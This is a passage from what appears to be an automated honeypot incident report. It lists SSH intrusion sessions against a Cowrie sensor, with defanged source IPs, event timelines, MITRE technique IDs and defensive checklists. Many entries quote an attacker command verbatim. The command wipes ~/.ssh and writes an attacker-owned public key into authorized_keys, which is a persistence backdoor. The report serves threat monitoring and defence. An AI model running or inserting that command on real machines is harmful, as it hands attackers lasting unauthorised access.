| `2026-06-13 22:30:28` | `cowrie.client.version` |
| `2026-06-13 22:30:28` | `cowrie.client.kex` |
| `2026-06-13 22:30:29` | `cowrie.login.success` |
| `2026-06-13 22:30:29` | `cowrie.session.params` |
| `2026-06-13 22:30:29` | `cowrie.command.input` |
| `2026-06-13 22:30:29` | `cowrie.command.failed` |
| `2026-06-13 22:30:30` | `cowrie.log.closed` |
| `2026-06-13 22:30:30` | `cowrie.session.params` |
| `2026-06-13 22:30:30` | `cowrie.command.input` |
| `2026-06-13 22:30:30` | `cowrie.session.file_download` |
| `2026-06-13 22:30:30` | `cowrie.log.closed` |
| `2026-06-13 22:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e5ec40db99

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-06-13 22:30 |
| **Last Seen** | 2026-06-13 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:30:33` | `cowrie.session.connect` |
| `2026-06-13 22:30:33` | `cowrie.client.version` |
| `2026-06-13 22:30:33` | `cowrie.client.kex` |
| `2026-06-13 22:30:34` | `cowrie.login.success` |
| `2026-06-13 22:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7e6a66f9b5

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:31 |
| **Last Seen** | 2026-06-13 22:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:31:44` | `cowrie.session.connect` |
| `2026-06-13 22:31:44` | `cowrie.client.version` |
| `2026-06-13 22:31:44` | `cowrie.client.kex` |
| `2026-06-13 22:31:44` | `cowrie.login.success` |
| `2026-06-13 22:31:45` | `cowrie.session.params` |
| `2026-06-13 22:31:45` | `cowrie.command.input` |
| `2026-06-13 22:31:45` | `cowrie.command.failed` |
| `2026-06-13 22:31:45` | `cowrie.log.closed` |
| `2026-06-13 22:31:45` | `cowrie.session.params` |
| `2026-06-13 22:31:45` | `cowrie.command.input` |
| `2026-06-13 22:31:45` | `cowrie.session.file_download` |
| `2026-06-13 22:31:45` | `cowrie.log.closed` |
| `2026-06-13 22:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a298b87ae0

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:31 |
| **Last Seen** | 2026-06-13 22:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:31:47` | `cowrie.session.connect` |
| `2026-06-13 22:31:47` | `cowrie.client.version` |
| `2026-06-13 22:31:47` | `cowrie.client.kex` |
| `2026-06-13 22:31:47` | `cowrie.login.success` |
| `2026-06-13 22:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc425ebe94d

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:34 |
| **Last Seen** | 2026-06-13 22:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:34:48` | `cowrie.session.connect` |
| `2026-06-13 22:34:48` | `cowrie.client.version` |
| `2026-06-13 22:34:48` | `cowrie.client.kex` |
| `2026-06-13 22:34:50` | `cowrie.login.success` |
| `2026-06-13 22:34:50` | `cowrie.session.params` |
| `2026-06-13 22:34:50` | `cowrie.command.input` |
| `2026-06-13 22:34:50` | `cowrie.command.failed` |
| `2026-06-13 22:34:51` | `cowrie.log.closed` |
| `2026-06-13 22:34:52` | `cowrie.session.params` |
| `2026-06-13 22:34:52` | `cowrie.command.input` |
| `2026-06-13 22:34:52` | `cowrie.session.file_download` |
| `2026-06-13 22:34:52` | `cowrie.log.closed` |
| `2026-06-13 22:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c24878fb76

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:34 |
| **Last Seen** | 2026-06-13 22:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:34:56` | `cowrie.session.connect` |
| `2026-06-13 22:34:56` | `cowrie.client.version` |
| `2026-06-13 22:34:56` | `cowrie.client.kex` |
| `2026-06-13 22:34:58` | `cowrie.login.success` |
| `2026-06-13 22:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565db2bbd897

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:47 |
| **Last Seen** | 2026-06-13 22:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:47:31` | `cowrie.session.connect` |
| `2026-06-13 22:47:31` | `cowrie.client.version` |
| `2026-06-13 22:47:31` | `cowrie.client.kex` |
| `2026-06-13 22:47:32` | `cowrie.login.success` |
| `2026-06-13 22:47:33` | `cowrie.session.params` |
| `2026-06-13 22:47:33` | `cowrie.command.input` |
| `2026-06-13 22:47:33` | `cowrie.command.failed` |
| `2026-06-13 22:47:34` | `cowrie.log.closed` |
| `2026-06-13 22:47:35` | `cowrie.session.params` |
| `2026-06-13 22:47:35` | `cowrie.command.input` |
| `2026-06-13 22:47:35` | `cowrie.session.file_download` |
| `2026-06-13 22:47:35` | `cowrie.log.closed` |
| `2026-06-13 22:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d195307678f

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:47 |
| **Last Seen** | 2026-06-13 22:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:47:39` | `cowrie.session.connect` |
| `2026-06-13 22:47:39` | `cowrie.client.version` |
| `2026-06-13 22:47:39` | `cowrie.client.kex` |
| `2026-06-13 22:47:41` | `cowrie.login.success` |
| `2026-06-13 22:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1ca007122f

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:50 |
| **Last Seen** | 2026-06-13 22:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:50:03` | `cowrie.session.connect` |
| `2026-06-13 22:50:03` | `cowrie.client.version` |
| `2026-06-13 22:50:04` | `cowrie.client.kex` |
| `2026-06-13 22:50:05` | `cowrie.login.success` |
| `2026-06-13 22:50:06` | `cowrie.session.params` |
| `2026-06-13 22:50:06` | `cowrie.command.input` |
| `2026-06-13 22:50:06` | `cowrie.command.failed` |
| `2026-06-13 22:50:07` | `cowrie.log.closed` |
| `2026-06-13 22:50:07` | `cowrie.session.params` |
| `2026-06-13 22:50:07` | `cowrie.command.input` |
| `2026-06-13 22:50:08` | `cowrie.session.file_download` |
| `2026-06-13 22:50:08` | `cowrie.log.closed` |
| `2026-06-13 22:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d537a87a80

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:50 |
| **Last Seen** | 2026-06-13 22:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:50:12` | `cowrie.session.connect` |
| `2026-06-13 22:50:12` | `cowrie.client.version` |
| `2026-06-13 22:50:12` | `cowrie.client.kex` |
| `2026-06-13 22:50:14` | `cowrie.login.success` |
| `2026-06-13 22:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38f5a3bb795b

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:52 |
| **Last Seen** | 2026-06-13 22:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:52:41` | `cowrie.session.connect` |
| `2026-06-13 22:52:41` | `cowrie.client.version` |
| `2026-06-13 22:52:42` | `cowrie.client.kex` |
| `2026-06-13 22:52:43` | `cowrie.login.success` |
| `2026-06-13 22:52:44` | `cowrie.session.params` |
| `2026-06-13 22:52:44` | `cowrie.command.input` |
| `2026-06-13 22:52:44` | `cowrie.command.failed` |
| `2026-06-13 22:52:45` | `cowrie.log.closed` |
| `2026-06-13 22:52:45` | `cowrie.session.params` |
| `2026-06-13 22:52:45` | `cowrie.command.input` |
| `2026-06-13 22:52:46` | `cowrie.session.file_download` |
| `2026-06-13 22:52:46` | `cowrie.log.closed` |
| `2026-06-13 22:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1fd929a24f

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:52 |
| **Last Seen** | 2026-06-13 22:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:52:51` | `cowrie.session.connect` |
| `2026-06-13 22:52:51` | `cowrie.client.version` |
| `2026-06-13 22:52:51` | `cowrie.client.kex` |
| `2026-06-13 22:52:52` | `cowrie.login.success` |
| `2026-06-13 22:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbfc21a18a2d

| Field | Detail |
|---|---|
| **Source IP** | `45.140.193[.]156` |
| **First Seen** | 2026-06-13 22:58 |
| **Last Seen** | 2026-06-13 22:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:58:12` | `cowrie.session.connect` |
| `2026-06-13 22:58:12` | `cowrie.client.version` |
| `2026-06-13 22:58:12` | `cowrie.client.kex` |
| `2026-06-13 22:58:14` | `cowrie.login.success` |
| `2026-06-13 22:58:15` | `cowrie.session.params` |
| `2026-06-13 22:58:15` | `cowrie.command.input` |
| `2026-06-13 22:58:15` | `cowrie.command.failed` |
| `2026-06-13 22:58:16` | `cowrie.log.closed` |
| `2026-06-13 22:58:17` | `cowrie.session.params` |
| `2026-06-13 22:58:17` | `cowrie.command.input` |
| `2026-06-13 22:58:17` | `cowrie.session.file_download` |
| `2026-06-13 22:58:17` | `cowrie.log.closed` |
| `2026-06-13 22:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.140.193[.]156` to AbuseIPDB if not already reported
- [ ] Block `45.140.193[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7570b8c340dc

| Field | Detail |
|---|---|
| **Source IP** | `45.140.193[.]156` |
| **First Seen** | 2026-06-13 22:58 |
| **Last Seen** | 2026-06-13 22:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:58:21` | `cowrie.session.connect` |
| `2026-06-13 22:58:21` | `cowrie.client.version` |
| `2026-06-13 22:58:22` | `cowrie.client.kex` |
| `2026-06-13 22:58:25` | `cowrie.login.success` |
| `2026-06-13 22:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.140.193[.]156` to AbuseIPDB if not already reported
- [ ] Block `45.140.193[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6671b02dacd

| Field | Detail |
|---|---|
| **Source IP** | `59.152.168[.]184` |
| **First Seen** | 2026-06-13 22:58 |
| **Last Seen** | 2026-06-13 22:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:58:36` | `cowrie.session.connect` |
| `2026-06-13 22:58:36` | `cowrie.client.version` |
| `2026-06-13 22:58:36` | `cowrie.client.kex` |
| `2026-06-13 22:58:37` | `cowrie.login.success` |
| `2026-06-13 22:58:37` | `cowrie.session.params` |
| `2026-06-13 22:58:37` | `cowrie.command.input` |
| `2026-06-13 22:58:37` | `cowrie.command.failed` |
| `2026-06-13 22:58:37` | `cowrie.log.closed` |
| `2026-06-13 22:58:38` | `cowrie.session.params` |
| `2026-06-13 22:58:38` | `cowrie.command.input` |
| `2026-06-13 22:58:38` | `cowrie.session.file_download` |
| `2026-06-13 22:58:38` | `cowrie.log.closed` |
| `2026-06-13 22:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.152.168[.]184` to AbuseIPDB if not already reported
- [ ] Block `59.152.168[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf465d6b477c

| Field | Detail |
|---|---|
| **Source IP** | `59.152.168[.]184` |
| **First Seen** | 2026-06-13 22:58 |
| **Last Seen** | 2026-06-13 22:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:58:40` | `cowrie.session.connect` |
| `2026-06-13 22:58:40` | `cowrie.client.version` |
| `2026-06-13 22:58:40` | `cowrie.client.kex` |
| `2026-06-13 22:58:41` | `cowrie.login.success` |
| `2026-06-13 22:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.152.168[.]184` to AbuseIPDB if not already reported
- [ ] Block `59.152.168[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd80513915c9

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-06-13 23:03 |
| **Last Seen** | 2026-06-13 23:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 23:03:47` | `cowrie.session.connect` |
| `2026-06-13 23:03:47` | `cowrie.client.version` |
| `2026-06-13 23:03:47` | `cowrie.client.kex` |
| `2026-06-13 23:03:47` | `cowrie.login.success` |
| `2026-06-13 23:03:47` | `cowrie.session.params` |
| `2026-06-13 23:03:47` | `cowrie.command.input` |
| `2026-06-13 23:03:47` | `cowrie.command.failed` |
| `2026-06-13 23:03:47` | `cowrie.log.closed` |
| `2026-06-13 23:03:47` | `cowrie.session.params` |
| `2026-06-13 23:03:47` | `cowrie.command.input` |
| `2026-06-13 23:03:47` | `cowrie.session.file_download` |
| `2026-06-13 23:03:47` | `cowrie.log.closed` |
| `2026-06-13 23:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.52.15[.]213` to AbuseIPDB if not already reported
- [ ] Block `152.52.15[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15e2ced21af

| Field | Detail |
|---|---|
| **Source IP** | `152.52.15[.]213` |
| **First Seen** | 2026-06-13 23:03 |
| **Last Seen** | 2026-06-13 23:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 23:03:49` | `cowrie.session.connect` |
| `2026-06-13 23:03:49` | `cowrie.client.version` |
| `2026-06-13 23:03:49` | `cowrie.client.kex` |
| `2026-06-13 23:03:49` | `cowrie.login.success` |
